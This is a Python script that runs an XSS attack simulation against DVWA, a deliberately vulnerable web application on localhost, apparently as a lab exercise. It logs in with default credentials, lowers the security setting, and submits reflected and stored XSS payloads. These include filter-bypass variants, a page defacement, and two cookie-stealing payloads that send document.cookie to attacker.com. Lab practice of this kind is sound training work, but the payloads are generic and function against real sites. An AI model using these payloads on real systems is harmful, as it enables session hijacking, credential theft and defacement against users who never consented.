#!/usr/bin/env python3
"""
XSS Attack Simulation Script
Target: DVWA
"""

import requests
import time
import json
from datetime import datetime

DVWA_URL = "http://localhost:8080"
LOG_FILE = "simulations/xss/evidence/attack_log.json"

class XSSSimulation:
    def __init__(self):
        self.session = requests.Session()
        self.attack_log = []

    def login_dvwa(self):
        resp = self.session.get(f"{DVWA_URL}/login.php")
        token = resp.text.split("user_token' value='")[1].split("'")[0]
        self.session.post(f"{DVWA_URL}/login.php", data={
            "username": "admin", "password": "password",
            "Login": "Login", "user_token": token
        })
        self.session.post(f"{DVWA_URL}/security.php",
                         data={"security": "low", "sumbmit": "Submit"})

    def phase1_reflected_xss(self):
        """Reflected XSS attacks"""
        print("\n[*] Phase 1: Reflected XSS")
        payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",

            # Cookie stealing simulation
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",

            # DOM manipulation
            "<script>document.body.innerHTML='<h1>Defaced!</h1>'</script>",

            # Encoded payloads (bypass filters)
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]

        for payload in payloads:
            resp = self.session.get(
                f"{DVWA_URL}/vulnerabilities/xss_r/",
                params={"name": payload}
            )
            self.attack_log.append({
                "timestamp": datetime.now().isoformat(),
                "type": "Reflected XSS",
                "payload": payload,
                "status": resp.status_code,
                "reflected": payload in resp.text
            })
            time.sleep(1)

    def phase2_stored_xss(self):
        """Stored XSS attacks"""
        print("\n[*] Phase 2: Stored XSS")
        payloads = [
            {
                "txtName": "Attacker",
                "mtxMessage": "<script>alert('Stored XSS')</script>",
                "btnSign": "Sign Guestbook"
            },
            {
                "txtName": "Hacker",
                "mtxMessage": "<img src=x onerror='fetch(\"http://attacker.com/log?cookie=\"+document.cookie)'>",
                "btnSign": "Sign Guestbook"
            }
        ]

        for payload in payloads:
            resp = self.session.post(
                f"{DVWA_URL}/vulnerabilities/xss_s/",
                data=payload
            )
            self.attack_log.append({
                "timestamp": datetime.now().isoformat(),
                "type": "Stored XSS",
                "payload": payload["mtxMessage"],
                "status": resp.status_code
            })
            time.sleep(1)

    def save_log(self):
        with open(LOG_FILE, 'w') as f:
            json.dump({"attacks": self.attack_log}, f, indent=2)
        print(f"[+] Log saved to {LOG_FILE}")

    def run(self):
        print("=" * 60)
        print("XSS ATTACK SIMULATION")
        print("=" * 60)
        self.login_dvwa()
        self.phase1_reflected_xss()
        self.phase2_stored_xss()
        self.save_log()

if __name__ == "__main__":
    XSSSimulation().run()
